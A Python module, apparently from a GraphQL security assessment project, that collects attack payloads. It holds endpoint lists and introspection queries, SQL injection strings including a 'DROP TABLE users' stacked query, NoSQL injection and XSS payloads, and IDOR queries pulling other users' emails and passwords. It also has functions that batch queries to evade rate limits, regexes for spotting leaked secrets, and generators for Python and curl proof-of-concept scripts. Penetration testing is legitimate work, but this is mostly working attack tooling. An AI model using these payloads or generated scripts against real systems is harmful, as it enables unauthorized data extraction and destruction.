"""
GraphQL Payload Database
Project #36: GraphQL Security Assessment
"""

# ==================================================================== #
# 1. COMMON GRAPHQL ENDPOINTS
# ==================================================================== #
COMMON_ENDPOINTS = [
    '/graphql',
    '/api/graphql',
    '/v1/graphql',
    '/v2/graphql',
    '/query',
    '/gql',
    '/api/query',
    '/graphql/v1',
    '/graphiql',
    '/api/graphql/v1',
]

# ==================================================================== #
# 2. INTROSPECTION QUERIES
# ==================================================================== #
INTROSPECTION_QUERY = """
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      fields {
        name
        type { name kind ofType { name kind } }
      }
    }
  }
}
"""

SIMPLE_INTROSPECTION = """
query { __schema { types { name } } }
"""

TYPES_ONLY = """
query { __schema { queryType { fields { name } } } }
"""

# ==================================================================== #
# 3. INJECTION PAYLOADS
# ==================================================================== #
SQLI_PAYLOADS = [
    {'name': 'sqli_or_1_1',      'value': "1' OR '1'='1"},
    {'name': 'sqli_union',       'value': "1' UNION SELECT NULL--"},
    {'name': 'sqli_comment',     'value': "1--"},
    {'name': 'sqli_stacked',     'value': "1; DROP TABLE users--"},
]

NOSQLI_PAYLOADS = [
    {'name': 'nosqli_ne_null',   'value': '{"$ne": null}'},
    {'name': 'nosqli_gt_empty',  'value': '{"$gt": ""}'},
    {'name': 'nosqli_regex',     'value': '{"$regex": ".*"}'},
    {'name': 'nosqli_where',     'value': '{"$where": "1==1"}'},
]

XSS_PAYLOADS = [
    {'name': 'xss_script',       'value': '<script>alert(1)</script>'},
    {'name': 'xss_img',          'value': '<img src=x onerror=alert(1)>'},
    {'name': 'xss_svg',          'value': '<svg/onload=alert(1)>'},
]

# ==================================================================== #
# 4. IDOR PAYLOADS
# ==================================================================== #
IDOR_QUERIES = [
    {
        'name': 'direct_user_read',
        'query': '{ user(id: ID) { id username email role } }',
        'description': 'Read another user\'s data by changing ID',
    },
    {
        'name': 'nested_user_posts',
        'query': '{ user(id: ID) { posts { id content author { email } } } }',
        'description': 'Extract nested user data (emails) via posts',
    },
    {
        'name': 'admin_fields',
        'query': '{ user(id: ID) { id username isAdmin role } }',
        'description': 'Access privileged fields via IDOR',
    },
    {
        'name': 'all_users',
        'query': '{ users { id username email password } }',
        'description': 'Extract all users (no auth)',
    },
]

# ==================================================================== #
# 5. RATE LIMIT BYPASS PAYLOADS
# ==================================================================== #
def build_alias_batch(user_ids, field='username'):
    """Build one query with N aliases — one HTTP request, N DB queries."""
    parts = []
    for i, uid in enumerate(user_ids):
        parts.append(f'  u{i}: user(id: {uid}) {{ {field} }}')
    return 'query {\n' + '\n'.join(parts) + '\n}'

def build_array_batch(query, count):
    """Build a JSON array of N identical queries."""
    return [{'query': query} for _ in range(count)]

def build_fragment_query(count):
    """Use fragments + aliases to amplify."""
    aliases = '\n'.join(f'  u{i}: user(id: {i}) {{ ...U }}' for i in range(count))
    return f'query {{\n{aliases}\n}}\nfragment U on User {{ id username email }}'

# ==================================================================== #
# 6. DETECTION SIGNATURES
# ==================================================================== #
SUCCESS_SIGNATURES = {
    'graphql_found':    r'"data"\s*:\s*\{|"__schema"|graphql',
    'introspection':    r'__schema|__type|queryType',
    'data_leaked':      r'@example\.com|password|token|secret',
    'admin_flag':       r'"isAdmin"\s*:\s*true|"role"\s*:\s*"admin"',
    'sqli_error':       r'SQL syntax|mysql_|PG::|ORA-|sqlite',
    'nosqli_behavior':  r'\$ne|\$gt|\$regex|\$where',
    'xss_stored':       r'<script|onerror=|onload=',
    'rate_limit':       r'429|rate limit|too many',
}

# ==================================================================== #
# 7. POC GENERATORS
# ==================================================================== #
def python_poc(url, query, description):
    return f'''#!/usr/bin/env python3
"""PoC: {description}"""
import requests
import json

URL = "{url}"
QUERY = """{query}"""

r = requests.post(URL, json={{"query": QUERY}}, timeout=10)
print("Status:", r.status_code)
print("Response:", r.text[:800])

if "data" in r.text and ("admin" in r.text.lower() or "@example.com" in r.text):
    print("[!] Vulnerability confirmed")
'''

def curl_poc(url, query):
    escaped = query.replace('"', '\\"')
    return f'''#!/bin/bash
# GraphQL PoC
curl -s -X POST "{url}" \\
  -H "Content-Type: application/json" \\
  -d '{{"query": "{escaped}"}}'
echo ""
'''

# ==================================================================== #
# 8. RISK SCORING
# ==================================================================== #
def score(issue_type):
    scores = {
        'introspection_enabled': 'MEDIUM',
        'sqli':                  'CRITICAL',
        'nosqli':                'CRITICAL',
        'xss':                   'HIGH',
        'idor_direct':           'HIGH',
        'idor_nested':           'CRITICAL',
        'rate_limit_bypass':     'MEDIUM',
        'all_users_exposed':     'CRITICAL',
        'admin_access':          'CRITICAL',
    }
    return scores.get(issue_type, 'MEDIUM')